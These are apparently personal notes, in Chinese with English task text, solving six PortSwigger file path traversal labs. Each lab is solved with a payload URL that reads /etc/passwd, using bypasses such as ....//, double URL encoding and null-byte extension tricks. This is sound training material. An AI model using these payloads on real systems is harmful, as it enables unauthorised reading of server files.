# Directory traversal

## [Lab: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
### 題目敘述
 This lab contains a file path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file. 
### 題目解釋
圖片網址的地方可以任意讀檔，嘗試讀取 `/etc/passwd`。

### 解答

觀察一個圖片

```
https://ac801f311fe78ab8c0bf223f000500bf.web-security-academy.net/image?filename=11.jpg
```

修改 Filename

```
https://ac801f311fe78ab8c0bf223f000500bf.web-security-academy.net/image?filename=../../../../../../../etc/passwd
```


## [Lab: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
### 題目敘述
This lab contains a file path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file. 
### 題目解釋
封鎖 `../` 之類的東西，但可以直接用絕對路徑，目標一樣是看 `/etc/passwd`
### 解答
```
https://ac8f1f041f3f4134c06c7b4500fb0046.web-security-academy.net/image?filename=/etc/passwd
```

## [Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
### 題目敘述
This lab contains a file path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 

### 題目解釋
他可能會拔掉 `../` 這樣的東西，所以改用 `....//` 來繞過

### 解答

```
https://ac9a1f2a1ee4835dc0b1094700f30004.web-security-academy.net/image?filename=....//....//....//....//....//....//....//....//....//etc/passwd
```

## [Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
### 題目敘述
This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 
### 題目解釋
Payload 可能會需要 URLEncode (雙重 Encode)
### 解答
```
https://ac881f2d1e5c2aaec0e6d408004d0047.web-security-academy.net/image?filename=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
```

## [Lab: File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
### 題目敘述
 This lab contains a file path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file. 

### 題目解釋
前面需要有固定檔名

### 解答
```
https://ace61f2a1f182da3c0fe7829002300e9.web-security-academy.net/image?filename=/var/www/images/../../../../../../etc/passwd
```

## [Lab: File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
### 題目敘述
 This lab contains a file path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file. 
### 題目解釋
強迫要有附檔名，可以用 `%00` 來繞
### 解答
```
https://acfc1fdf1f31bbdec0a104ac00fc003b.web-security-academy.net/image?filename=../../../../../../etc/passwd%00.jpg
```
